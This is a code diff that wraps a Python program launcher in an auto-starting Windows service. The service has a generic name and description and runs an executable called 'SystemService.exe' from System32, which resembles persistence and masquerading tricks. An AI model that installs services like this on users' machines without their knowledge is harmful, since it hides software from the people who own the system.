@@ -2,6 +2,13 @@ import os
 import subprocess
 import urllib.request
 import json
+import servicemanager
+import win32event
+import win32service
+import win32serviceutil
+import win32timezone
+import sys
+import os
 
 class StartProgram:
     def __init__(self, program_path="program.exe", server_url="http://localhost:8000"):
@@ -65,5 +72,40 @@ class StartProgram:
         except Exception as e:
             print(f"Error launching program: {e}")
 
-program = StartProgram("program.exe", "http://localhost:7070")
-program.start()
+
+class ServiceManager(win32serviceutil.ServiceFramework):
+    _svc_name_ = "ServiceManager"
+    _svc_display_name_ = "Service manager"
+    _svc_description_ = "Managing windows services"
+    _svc_type_ = win32service.SERVICE_AUTO_START
+
+    _svc_account_ = os.getlogin()
+
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+
+    def SvcDoRun(self):
+        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_, ''))
+        self.main()
+
+    def main(self):
+        program = StartProgram(r"C:\Windows\System32\SystemService.exe", "localhost:8000")
+        program.start()
+
+if len(sys.argv) == 1:
+    servicemanager.Initialize()
+    servicemanager.PrepareToHostSingle(ServiceManager)
+    servicemanager.StartServiceCtrlDispatcher()
+else:
+    win32serviceutil.HandleCommandLine(ServiceManager)
+
+# How to use:
+# program.exe install
+# program.exe start
+# program.exe remove
+
